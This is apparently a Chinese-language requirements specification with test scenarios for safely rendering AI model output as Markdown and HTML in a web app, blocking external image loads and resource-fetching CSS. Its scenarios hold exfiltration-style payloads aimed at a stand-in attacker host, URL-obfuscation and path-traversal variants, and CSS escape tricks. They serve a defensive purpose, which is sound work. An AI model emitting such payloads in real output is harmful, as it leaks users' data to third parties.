# agents/ai-output-rendering Specification

## Purpose
规定模型输出在网页上按 Markdown 渲染时浏览器可以自动加载什么：只有站内文件代理下的图片会显示，其它图片地址一律不加载；同时规定被拦下的图片与外部链接怎么呈现、规则覆盖哪些页面。

## Requirements

### Requirement: 允许清单之外的图片不自动加载
模型输出按 Markdown 渲染时，图片地址不在允许清单内的，页面 SHALL NOT 生成图片元素，也 SHALL NOT 生成任何会让浏览器不经用户操作就请求该地址的元素（含预加载）。行内写法、引用式写法、协议相对地址、带反斜杠或控制字符的变形地址、包在链接里的图片 SHALL 同样处理。模型输出里的原始 HTML SHALL 按文字显示，SHALL NOT 被当作标签渲染。

#### Scenario: 行内外部图片
- **WHEN** 运行 `npx tsx src/components/__tests__/ai-markdown.test.tsx`，渲染 `![报价](https://attacker.example/p.png?d=SECRET)`
- **THEN** 渲染结果里没有图片元素、没有预加载元素，也没有任何 `src` 属性指向 `attacker.example`

#### Scenario: 引用式写法
- **WHEN** 同一测试渲染一张用引用式写法（`![x][r]` 加地址定义）指向 `https://attacker.example/ref.png` 的图片
- **THEN** 渲染结果里没有图片元素

#### Scenario: 协议相对与变形地址
- **WHEN** 运行 `npx tsx src/lib/ai-markdown/__tests__/url-policy.test.ts`，判定 `//attacker.example/a.png`、`/\attacker.example/a.png`、中间夹制表符的 `/<TAB>/attacker.example/a.png`、`data:image/png;base64,AAAA`、`javascript:alert(1)`
- **THEN** 每一条都判定为不允许

#### Scenario: 包在链接里的图片
- **WHEN** 渲染测试渲染 `[![看图](https://attacker.example/i.png)](https://attacker.example/l)`
- **THEN** 渲染结果里没有图片元素；链接仍在，里面是文字提示

#### Scenario: 原始 HTML 图片标签
- **WHEN** 渲染测试渲染 `<img src="https://attacker.example/raw.png">`
- **THEN** 这段内容以转义后的文字出现，渲染结果里没有图片元素

### Requirement: 被拦下的图片显示为不可点击的文字提示
被拦下的图片 SHALL 在原位置显示一段文字提示，含「图片未加载」、该图片的替代文字（有则显示）与地址的主机名（有则显示）。这段提示 SHALL NOT 是链接或按钮，SHALL NOT 输出图片地址的路径与查询串。

#### Scenario: 提示的内容
- **WHEN** 运行 `npx tsx src/components/__tests__/ai-markdown.test.tsx`，渲染 `![报价](https://attacker.example/p.png?d=SECRET)`
- **THEN** 渲染结果的文字里有「图片未加载」「报价」「attacker.example」，没有 `SECRET`，这段提示不在任何链接元素之内

#### Scenario: 没有替代文字
- **WHEN** 同一测试渲染 `![](https://attacker.example/p.png)`
- **THEN** 提示里有「图片未加载」与 `attacker.example`，没有多余的空括号或空冒号

### Requirement: 站内文件图片照常显示
图片地址是站内相对路径、且规范化之后位于站内文件代理（`/api/files/`）之下时，页面 SHALL 把它渲染为图片，图片地址取规范化之后的站内路径。站内的其它路径、规范化之后落到 `/api/files/` 之外的路径、以及任何带协议或主机的绝对地址（含指向青砚自己域名的） SHALL NOT 渲染为图片。

#### Scenario: 站内文件图片
- **WHEN** 运行 `npx tsx src/components/__tests__/ai-markdown.test.tsx`，渲染 `![效果图](/api/files/ai-chat/org1/a.png)`
- **THEN** 渲染结果里有一个图片元素，`src` 为 `/api/files/ai-chat/org1/a.png`，`alt` 为「效果图」

#### Scenario: 路径穿越
- **WHEN** 运行 `npx tsx src/lib/ai-markdown/__tests__/url-policy.test.ts`，判定 `/api/files/../auth/logout` 与 `/api/files/%2e%2e/auth/logout`
- **THEN** 两条都判定为不允许

#### Scenario: 站内其它路径与绝对地址
- **WHEN** 同一测试判定 `/api/auth/logout`、`/dashboard`、`api/files/a.png`（不以 `/` 开头）、`https://qingyan.example/api/files/a.png`
- **THEN** 每一条都判定为不允许

### Requirement: 规则覆盖全部渲染模型输出的页面
助手对话、外贸对话、市场情报监测详情、市场情报手动分析、标讯情报卡 SHALL 全部按本能力的规则渲染模型输出。仓库里 SHALL NOT 存在绕开这套规则、直接把模型输出交给 Markdown 渲染库的页面或组件。

#### Scenario: 五个页面都走统一渲染
- **WHEN** 运行 `npx tsx src/components/__tests__/ai-markdown.test.tsx`，对五个页面的源码做断言
- **THEN** 五个文件都使用统一渲染组件，且都不再直接引入 Markdown 渲染库

#### Scenario: 没有第二处直接渲染
- **WHEN** 同一测试扫描 `src/` 下全部 `.ts` / `.tsx` 源文件
- **THEN** 直接引入 Markdown 渲染库的文件只有统一渲染组件一个；新增第二个时测试失败并列出文件路径

#### Scenario: 调用方不能把图片规则换掉
- **WHEN** 同一测试以调用方自带的图片与链接渲染覆盖项渲染 `![x](https://attacker.example/p.png)`
- **THEN** 渲染结果里仍然没有图片元素

### Requirement: 外部链接可点击并显示真实去向
模型输出里的链接 SHALL 保持可点击。指向外部主机的链接 SHALL 在新标签页打开，SHALL NOT 向目标站传递来源页地址，SHALL NOT 让目标页拿到打开它的窗口；链接文字里不含目标主机名时，页面 SHALL 在链接之后显示该主机名。站内相对链接 SHALL 维持在当前页打开且不附加主机名。

#### Scenario: 文字与去向不一致的外部链接
- **WHEN** 运行 `npx tsx src/components/__tests__/ai-markdown.test.tsx`，渲染 `[查看报价详情](https://attacker.example/c?d=1)`
- **THEN** 链接的 `href` 不变，带 `target="_blank"`，`rel` 含 `noopener` 与 `noreferrer`，链接之后的文字里有 `attacker.example`

#### Scenario: 文字本身就是地址
- **WHEN** 同一测试渲染一段含裸地址 `https://docs.example.org/guide` 的文字
- **THEN** 该地址成为外部链接，带新标签页与 `rel` 属性，链接之后不重复显示主机名

#### Scenario: 站内链接
- **WHEN** 同一测试渲染 `[打开项目](/projects/abc)`
- **THEN** 链接没有 `target` 属性，之后没有主机名

### Requirement: 渲染规则是确定性的且不改服务端
本能力的判定 SHALL NOT 调用模型，SHALL NOT 发起网络请求，SHALL NOT 依赖环境变量或开关：同一段输入在任何组织、任何用户、任何部署环境下得到同一渲染结果。本能力 SHALL NOT 改变任何接口的响应、存库的消息文本或发往微信 / Muse 通道的文字。

#### Scenario: 服务端与数据结构无改动
- **WHEN** 在仓库根运行 `git diff --stat main -- src/app/api prisma vercel.json next.config.ts src/proxy.ts`
- **THEN** 输出为空

#### Scenario: 判定不读环境
- **WHEN** 运行 `npx tsx src/lib/ai-markdown/__tests__/url-policy.test.ts`，对地址判定模块的源码做断言
- **THEN** 其中没有对 `process.env`、`window`、`fetch` 的引用

### Requirement: HTML 预览里允许清单之外的图片不自动加载
模型起草的 HTML 在页面上预览时，图片地址不在允许清单内的，预览 SHALL NOT 含图片元素，也 SHALL NOT 含任何会让浏览器不经用户操作就请求该地址的元素或属性；原位置 SHALL 显示与 Markdown 渲染相同的不可点击文字提示。允许清单与 Markdown 渲染相同：以单个 `/` 开头、解析后不离开站内、规范化路径位于 `/api/files/` 之下。

#### Scenario: 外部图片不发请求
- **WHEN** 运行 `npx tsx src/lib/common/__tests__/sanitize-html.test.ts`（有 Chromium 时），在真实浏览器里把 `<p>您好</p><img src="https://attacker.example/p.png?d=SECRET" alt="报价">` 净化后放进页面
- **THEN** 浏览器没有向 `attacker.example` 发任何请求；预览里没有 `img` 元素，有「图片未加载」的文字提示，提示里没有地址的路径与查询串

#### Scenario: 变形地址与多来源属性
- **WHEN** 同一测试对 `//attacker.example/x`、`/\attacker.example/x`、`data:` 地址，以及带 `srcset` 的图片做同样的事
- **THEN** 都没有外部请求，都没有 `img` 元素留下

#### Scenario: 站内文件图片照常显示
- **WHEN** 同一测试净化 `<img src="/api/files/ai-chat/o1/a.png" alt="现场图">`
- **THEN** 预览里保留这张图片，地址是规范化后的站内路径

### Requirement: HTML 预览里的内联样式不能加载资源
预览里元素的内联样式 SHALL 只保留不会让浏览器加载资源的声明。含 `url()`、`image-set()` 或其它不在允许清单（`rgb`、`rgba`、`hsl`、`hsla`、`calc`）内的函数的声明 SHALL 被去掉；值里带反斜杠转义、注释或 `@` 的声明 SHALL 被去掉。颜色、间距、宽高、字体、对齐等普通声明 SHALL 保留。

#### Scenario: 背景图不发请求
- **WHEN** 运行同一测试（有 Chromium 时），在真实浏览器里净化并显示 `<div style="color:#333;background:url(https://attacker.example/b.png?d=SECRET)">正文</div>`
- **THEN** 浏览器没有向 `attacker.example` 发任何请求；`color:#333` 保留

#### Scenario: 转义与变体写法
- **WHEN** 运行同一测试的纯函数段，对 `background:u\72l(//x)`、`background-image:image-set("//x" 1x)`、`list-style:URL( //x )`、`background:/**/url(//x)`、`width:expression(alert(1))` 做净化
- **THEN** 这些声明都被去掉

#### Scenario: 普通样式保留
- **WHEN** 同一段净化 `color:#333; padding:8px 12px; background:#f5f5f5; width:100%; font-family:Arial, sans-serif; border:1px solid rgb(0,0,0); margin:calc(1em + 2px)`
- **THEN** 每一条声明都保留，顺序不变

### Requirement: 没有浏览器环境时不放行原文
`sanitizeHtml` 在没有浏览器环境（服务端渲染）时 SHALL 返回空字符串，SHALL NOT 原样返回传入的 HTML。

#### Scenario: 服务端调用
- **WHEN** 运行同一测试（Node 环境，没有 `window`），调用 `sanitizeHtml('<img src="https://attacker.example/x">')`
- **THEN** 返回空字符串

### Requirement: 直接渲染 HTML 的位置有清单
仓库里把 HTML 字符串直接放进页面的位置 SHALL 限于登记的清单；模型起草的 HTML SHALL 只经 `sanitizeHtml` 进入页面。清单之外出现新的位置时测试 SHALL 失败。

#### Scenario: 没有清单之外的位置
- **WHEN** 运行同一测试，扫描 `src/` 下全部 `.tsx` 与 `.ts`（不含测试）里的 `dangerouslySetInnerHTML`
- **THEN** 只出现在登记的四个文件里；其中两个邮件预览都把内容先交给 `sanitizeHtml`

### Requirement: 预览规则不改发出的邮件
本规则 SHALL 只改变预览在页面上的呈现。发出的邮件内容、服务端代码、数据结构 SHALL NOT 因此改变。

#### Scenario: 服务端与数据结构无改动
- **WHEN** 对本次改动运行 `git diff --stat main -- src/app/api prisma vercel.json`
- **THEN** 没有输出
